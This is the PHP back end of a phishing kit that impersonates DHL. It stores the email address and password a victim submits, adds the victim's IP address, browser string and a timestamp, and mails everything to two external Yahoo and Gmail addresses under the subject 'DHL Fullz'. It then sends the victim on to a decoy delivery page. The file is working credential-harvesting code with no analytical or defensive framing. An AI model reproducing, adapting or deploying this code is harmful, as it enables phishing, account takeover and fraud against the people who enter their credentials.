<?php
session_start();

$_SESSION['email'] = $_POST['email'];
$_SESSION['epass'] = $_POST['epass'];


$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$email = $_POST['email'];
$epass = $_POST['epass'];

$message = "--------+ DHL Wire ReZulT +--------\n";
$message .= "Email ID : ".$_POST['email']."\n";
$message .= "Email Password : ".$_POST['epass']."\n";
$message .= "-----------------------------------\n";
$message .= "User Agent : ".$browser."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--+ Created BY GAZAWORLDBO$$ +---\n";

$send = "curhoneygrace@yahoo.com, curhoney2020@gmail.com";

$subject = "DHL Fullz | $email";
$headers .= "MIME-Version: 1.0\n";

mail($send,$subject,$message,$headers);
header("Location: delivery.php?rand=13InboxLightaspxn.1774256418&fid&1252899642&fid.1&fav.1&email=$email");
die;

?>